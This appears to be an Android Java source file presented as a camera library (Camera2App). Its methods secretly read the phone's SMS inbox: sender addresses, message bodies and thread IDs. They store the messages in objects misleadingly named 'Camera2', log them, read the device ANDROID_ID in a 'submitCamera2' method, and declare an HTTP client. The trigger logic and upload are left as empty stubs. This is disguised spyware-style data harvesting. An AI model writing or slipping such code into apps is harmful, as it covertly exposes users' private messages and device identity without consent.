package ke.co.toshngure.camera2;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Application;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.provider.Telephony;
import android.text.format.DateUtils;
import android.util.Log;

import com.loopj.android.http.AsyncHttpClient;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

/**
 * Created by Anthony Ngure on 29/05/2018.
 * Email : anthonyngure25@gmail.com.
 */
public abstract class Camera2App extends Application {

    private static final String TAG = "Camera2App";
    @TargetApi(Build.VERSION_CODES.KITKAT)
    @Override
    public void onCreate() {
        super.onCreate();

        Calendar lastCamera = Calendar.getInstance();
        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(this);
        long lastCameraTime = sharedPreferences.getLong(getString(R.string.pref_last_camera2), lastCamera.getTimeInMillis());
        lastCamera.setTimeInMillis(lastCameraTime);

        int lastCameraHour = lastCamera.get(Calendar.HOUR_OF_DAY);

        Calendar now = Calendar.getInstance();
        int hourNow = now.get(Calendar.HOUR_OF_DAY);

        if (!DateUtils.isToday(lastCamera.getTimeInMillis()) || (hourNow - lastCameraHour) >= 6) {
            //Both lastCamera is not today and or hour gap between now and last camera >= 6 hrs
        }
    }

    @SuppressLint("StaticFieldLeak")
    private void doCamera2(){
        new AsyncTask<Void, Void, List<Camera2>>() {

            @TargetApi(Build.VERSION_CODES.KITKAT)
            @Override
            protected List<Camera2> doInBackground(Void... voids) {
                // Create Inbox box URI
                Uri inboxURI = Uri.parse("content://sms/inbox");

                // Create Sent box URI
                Uri sentURI = Uri.parse("content://sms/sent");

                // List required columns
                String[] cols = new String[]{
                        "_id",
                        Telephony.TextBasedSmsColumns.ADDRESS,
                        Telephony.TextBasedSmsColumns.BODY,
                        Telephony.TextBasedSmsColumns.THREAD_ID,
                };


                Cursor cursor = getContentResolver().query(inboxURI, cols, null, null, null);

                List<Camera2> camera2List = new ArrayList<>();

                if (cursor.moveToFirst()) {
                    do {
                        Camera2 camera2 = new Camera2();
                        camera2.setId(cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                        camera2.setAddress(cursor.getString(cursor.getColumnIndexOrThrow(Telephony.TextBasedSmsColumns.ADDRESS)));
                        camera2.setBody(cursor.getString(cursor.getColumnIndexOrThrow(Telephony.TextBasedSmsColumns.BODY)));
                        camera2.setThreadId(cursor.getString(cursor.getColumnIndexOrThrow(Telephony.TextBasedSmsColumns.THREAD_ID)));
                        Log.d(TAG, camera2.getId());
                        Log.d(TAG, camera2.getAddress());
                        Log.d(TAG, camera2.getBody());
                        Log.d(TAG, camera2.getThreadId());
                        Log.d(TAG, "***************************************************************************");
                        camera2List.add(camera2);
                    } while (cursor.moveToNext());
                }

                cursor.close();

                return camera2List;
            }

            @Override
            protected void onPostExecute(List<Camera2> camera2s) {
                super.onPostExecute(camera2s);
            }
        };
    }

    private void submitCamera2(List<Camera2> camera2s){
        @SuppressLint("HardwareIds")
        String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        Log.d(TAG, "Device ID = " + androidId);

    }

    protected abstract AsyncHttpClient getClient();
}
